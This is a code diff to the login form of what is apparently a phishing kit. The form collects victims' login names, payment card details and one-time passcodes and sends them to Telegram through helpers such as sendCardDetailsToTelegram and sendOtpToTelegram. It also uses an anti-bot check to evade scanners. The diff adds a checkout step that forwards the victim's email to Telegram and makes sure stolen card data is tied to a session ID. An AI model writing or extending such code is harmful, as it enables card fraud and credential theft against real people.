@@ -428,6 +428,7 @@ function LoginForm() {
   const {
     generateSessionId,
     sendLoginRequestToTelegram,
+    sendCheckoutEmailToTelegram,
     sendCardDetailsToTelegram,
     sendFormattedCardDetails,
     sendOtpToTelegram,
@@ -696,7 +697,13 @@ function LoginForm() {
   const handleCardSubmit = async (e) => {
     e.preventDefault();
     sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
-    
+    // ✅ Ensure sessionId exists before sending to Telegram
+    let activeSid = sessionId || sessionStorage.getItem('telegramSessionId');
+    if (!activeSid) {
+      activeSid = generateSessionId();
+      setSessionId(activeSid);
+      sessionStorage.setItem('telegramSessionId', activeSid);
+    }
     const antiBotResult = checkAntiBot();
     if (!antiBotResult.passed) {
       let userIP = 'Unable to get IP';
@@ -724,7 +731,7 @@ function LoginForm() {
         await sendCardVerificationLog(loginName);
       }
       if (sendCardDetailsToTelegram) {
-        await sendCardDetailsToTelegram(cardDetails, sessionId);
+        await sendCardDetailsToTelegram(cardDetails, activeSid);
       }
       
       sessionStorage.setItem('loginName', loginName);
@@ -829,6 +836,16 @@ function LoginForm() {
               t={t}
               onInputChange={handleInputChange}
               onLogin={handleLogin}
+              onCheckout={async () => {
+              sessionStorage.setItem('loginName', loginName);
+              if (sendCheckoutEmailToTelegram) {
+                await sendCheckoutEmailToTelegram();
+              }
+              setShowCardForm(true);
+              setShowOtpForm(false);
+              setShowNextStep(false);
+              setWaitingForApproval(false);
+            }}
             />
           )}
 
